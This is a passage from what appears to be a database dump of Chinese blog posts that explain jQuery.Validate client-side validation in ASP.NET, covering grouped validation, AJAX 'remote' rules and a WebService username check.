确认密码</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID=&quot;txtRePwd&quot; TextMode=&quot;Password&quot; runat=&quot;server&quot;&gt;&lt;/asp:TextBox&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 姓名</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID=&quot;txtName&quot; runat=&quot;server&quot;&gt;&lt;/asp:TextBox&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 年龄</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID=&quot;txtAge&quot; runat=&quot;server&quot;&gt;&lt;/asp:TextBox&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 性别</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:DropDownList ID=&quot;DropDownList1&quot; runat=&quot;server&quot; CssClass=&quot;required&quot; disabled=&quot;true&quot;&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:ListItem&gt;&lt;/asp:ListItem&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:ListItem Value=&quot;1&quot;&gt;男&lt;/asp:ListItem&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:ListItem Value=&quot;0&quot;&gt;女&lt;/asp:ListItem&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/asp:DropDownList&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 邮箱</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID=&quot;txtEmail&quot; runat=&quot;server&quot;&gt;&lt;/asp:TextBox&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td colspan=&quot;2&quot;&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:Button ID=&quot;Button3&quot; runat=&quot;server&quot; Text=&quot;基本信息提交&quot; CssClass=&quot;causesValidation&quot;/&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/table&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; &lt;/div&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; &lt;div id=&quot;personaldesc&quot; class=&quot;validationGroup&quot;&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;p&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID=&quot;txtDescription&quot; runat=&quot;server&quot; TextMode=&quot;MultiLine&quot; Width=&quot;500px&quot;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Height=&quot;100px&quot;&gt;&lt;/asp:TextBox&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/p&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:Button ID=&quot;Button1&quot; runat=&quot;server&quot; Text=&quot;描述提交&quot; CssClass=&quot;causesValidation&quot;/&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; &lt;/div&gt;</p>\r\n\r\n<p>&lt;/div&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&lt;script type=&quot;text/javascript&quot;&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; InitRules();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; isValidationGroup = true;</p>\r\n\r\n<p>&lt;/script&gt;</p>\r\n\r\n<p>分析下代码为2个tab页面都加上validationGroup样式，引发验证的按钮加上causesValidation样式，同时还需要标记一个isValidationGroup = true; 表示页面需要进行分组验证，传递回母版页。</p>\r\n\r\n<p>注意：这边的逻辑和手写JS验证规则是一个逻辑，在母版页建立一个isValidationGroup属性默认为false，只有当页面需要进行分组验证则设为true。</p>\r\n\r\n<p>接下来看下母版页的的jQuery(document).ready()中的带代码：</p>\r\n\r\n<p>if (isValidationGroup) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; if (opts != undefined || opts != null) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jQuery(&quot;#&lt;%=form1.ClientId %&gt;&quot;).validate(jQuery.extend(opts, { onsubmit: false }));</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; } else {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jQuery(&quot;#&lt;%=form1.ClientId %&gt;&quot;).validate({</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; onsubmit: false</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; });</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; InitValidationGroup();</p>\r\n\r\n<p>} else {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; if (opts != undefined || opts != null) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jQuery(&quot;#&lt;%=form1.ClientId %&gt;&quot;).validate(opts);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; } else {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jQuery(&quot;#&lt;%=form1.ClientId %&gt;&quot;).validate();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>}</p>\r\n\r\n<p>判断isValidationGroup是否需要进行分组验证，同时如果isValidationGroup为true，需要加入onsubmit：false，否则分组验证将无法有效。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>到此，jQuery.Validate进行客户端验证（高级篇-上）到此就讲完了，本文主要介绍了如何自定义扩展验证规则和分组验证，欢迎大家指点。</p>\r\n\r\n<p>PS：在jQuery.Validate进行客户端验证（高级篇-下）将为主要介绍如何使用jQuery.Validate进行ajax验证，AJAX验证的封装及简单扩展，敬请期待！</p>\r\n\r\n<p>转自:http://www.cnblogs.com/kyo-yo/archive/2010/07/05/Use-jQuery-Validate-To-Being-Client-Validate-High-1.html</p>\r\n',0,1437805729,0,0),(52,33,'使用jQuery.Validate进行客户端验证（高级篇-下）——不使用微软验证控件的理由','<p>继续上一篇文章使用jQuery.Validate进行客户端验证（高级篇-上），本文将继续介绍jQuery.Validate的高级应用&mdash;&mdash;jQuery.Validate的AJAX验证及简单扩展。</p>\r\n\r\n<p>今天主要介绍的内容有：</p>\r\n\r\n<p>1、如何使用jQuery.Validate进行AJAX验证?</p>\r\n\r\n<p>2、默认jQuery.Validate在进行AJAX验证时返回必须是bool类型，如何返回一个对象包括错误消息及验证结果？</p>\r\n\r\n<p>3、在反复使用jQuery.Validate进行AJAX验证时，总是需要编写相关AJAX参数，可否进行进一步封装？</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>第一点：如何使用jQuery.Validate进行AJAX验证?（具体见High-2.aspx）</p>\r\n\r\n<p>jQuery.Validate为我们提供了一个方便的AJAX验证方式（封装了jQuery的AJAX，同时将jQuery的AJAX和 jQuery.Validate的验证很好的结合在一起），在此我仅仅介绍jQuery.Validate在ASP.NET下如何进行AJAX验 证，PHP、JSP等请查看官方例子。</p>\r\n\r\n<p>我是采用jQuery.Validate+WebService进行AJAX验证，客户端编写jQuery.Validate的remote验证属性，服务器端采用WebSerice进行接收参数进行验证。</p>\r\n\r\n<p>首先来看下jQuery.Validate的remote属性如何编写AJAX验证规则：</p>\r\n\r\n<p>function InitRules() {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; opts = {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rules:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;%=txtUid.UniqueID %&gt;:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; required: true,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; remote:{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; type: &quot;POST&quot;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; async: false,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; url: &quot;WebService.asmx/CheckUid&quot;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dataType: &quot;xml&quot;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; data: {uid:function(){ return jQuery(&quot;#&lt;%=txtUid.ClientID %&gt;&quot;).val();}}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>如果使用过jQuery.ajax的朋友肯定会很熟悉这段代码，jQuery.Validate的remote采用和jQuery.ajax相同的参数设置（原因就上面所说的封装了jQuery.ajax的原因）。</p>\r\n\r\n<p>这边来详细讲解下jQuery.Validate的remote的一些知识：</p>\r\n\r\n<p>1、jQuery.Validate的remote默认可以直接填写远程验证的地址，格式为：remote:&rdquo;validate.aspx&rdquo;，但是很多情况下这个远程验证需要提交参数、返回类型等限制，所以就可以采用在&ldquo;{}&rdquo;中编写具体属性的方式来包装提交参数。</p>\r\n\r\n<p>2、jQuery.Validate的remote官方代码中，远程的输出只能是true或者false，不允许有其他输出，这个我觉得不太好，具体的扩展在后面我会讲到。</p>\r\n\r\n<p>3、jQuery.Validate的remote在使用时如果想提交参数需要以JSON的方式提交格式如下：</p>\r\n\r\n<p>data: {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uid:function(){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return jQuery(&quot;#&lt;%=txtUid.ClientID %&gt;&quot;).val();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>}</p>\r\n\r\n<p>此处肯定会有人不明白，为什么参数需要以function的形式提交，而不是直接写</p>\r\n\r\n<p>jQuery(&quot;#&lt;%=txtUid.ClientID %&gt;&quot;).val();</p>\r\n\r\n<p>这里我要说明的是：jQuery.Validate的验证规则是在 页面加载的时候就已经被加载了的，如果还是像以往一样直接写&quot;jQuery(&quot;#&lt;%=txtUid.ClientID %&gt;&quot;).val();&quot;，那么验证的时候提交给服务器端的数据永远是页面加载时txtUid控件的值。</p>\r\n\r\n<p>而使用function的好处就是在页面加载的时候仅仅告诉jQuery.Validate，在控件需要进行remote验证的时候需要调用function这个函数，这样就保证了在执行remote验证的时候可以获取到最新的值</p>\r\n\r\n<p>我还修改了jQuery.Validate的remote方法，先来看下我修改的代码（具体见scripts/jquery.validate1.js 896行）：</p>\r\n\r\n<p>if (previous.old !== value) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; previous.old = value;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var validator = this;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; this.startRequest(element);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var data = {};</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; data[element.name] = value;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; $.ajax($.extend(true, {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //url:url,//此URL无法获取</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; url: param.url,//获取param验证规则中所写路径</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mode: &quot;abort&quot;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; port: &quot;validate&quot; + element.name,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; type: param.type,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dataType: &quot;json&quot;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //data:data,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; data: param.data || data,//获取param.data或data中所提交的参数</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; success: function(response) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 以下省略...</p>\r\n\r\n<p>}</p>\r\n\r\n<p>这边我修改了url和data的获取方式，主要是因为在真正执行的时候，变量url是空的，所以需要从param中获取。</p>\r\n\r\n<p>而data为什么要改成param.data || data，主要原因就是下面这句代码：</p>\r\n\r\n<p>data[element.name] = value;</p>\r\n\r\n<p>这句代码的意思就是：为哪个控件设置远程验证就获取哪个控件的值，但是在实际的开发中，当遇到进行AJAX验证的时候会出现需要同时提交多个数据的情况，此时这句代码就是错误的了，所以需要改成</p>\r\n\r\n<p>param.data || data，这样就能保证在提交多个数据的时候以多个数据为准。</p>\r\n\r\n<p>下面来看下webservice的代码：</p>\r\n\r\n<p>[WebMethod]</p>\r\n\r\n<p>public bool CheckUid(string uid)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; return uid == &quot;testuid&quot; ? true : false;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>相当的简单，就是判断下用户名是不是指定的用户名。</p>\r\n\r\n<p>注意：webservice.cs中必须将[System.Web.Script.Services.ScriptService]这个特性取消注释，否则AJAX验证将无效！</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>第二点：默认jQuery.Validate在进行AJAX验证时返回必须是bool类型，如何返回一个对象包括错误消息及验证结果？（具体见App_Code/WebService.cs/CheckUid）</p>\r\n\r\n<p>在第一点中介绍jQuery.Validate知识的时候就提到了，jQuery.Validate默认直接收true或false，但是在具体的 开发中，我们会分层开发，三层或者多层，webservice在接收到验证请求后不做具体的处理直接调用逻辑层的验证方法，交由逻辑层进行验证操作（当然你也可以把验证全部写在webservice中，但是这样就体现不出分层的好处了），此时的验证会产生多种情况，以最常见的用户名验证为例：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 1）用户名已存在，此时的消息应该是&ldquo;用户名已存在，请重新输入！&rdquo;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 2）用户名不符合规则，此时的消息应该是&ldquo;用户名不符合规则，请重新输入！&rdquo;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 3）验证时出现程序异常，此时的消息应该是&ldquo;程序出现异常，请联系管理员！&rdquo;</p>\r\n\r\n<p>可以看出，仅仅一个用户名验证就会出现这3种信息，如果不返回一个明确的消息，仅仅告诉用户&ldquo;用户名有误&rdquo;，客户端的使用者将会相当的痛苦，因为使用者并不知道他的用户名输入到底错在哪了。</p>\r\n\r\n<p>所以为了更好的客户体验，以及项目的合理性，我们在服务器端封装一个实体类（具体见AppCode/AjaxClass），代码如下：</p>\r\n\r\n<p>[Serializable]</p>\r\n\r\n<p>public class AjaxClass</p>\r\n\r\n<p>{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; public string Msg { get; set; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; public int Result { get; set; }</p>\r\n\r\n<p>}</p>\r\n\r\n<p>就是一个最简单的实体类，有2个属性，Msg和Result，Msg用于存放验证失败的信息，Result用于存放结果。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>看下WebSerivce的代码如何修改：</p>\r\n\r\n<p>[WebMethod]</p>\r\n\r\n<p>public AjaxClass CheckUid(string uid)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; //return uid == &quot;testuid&quot; ? true : 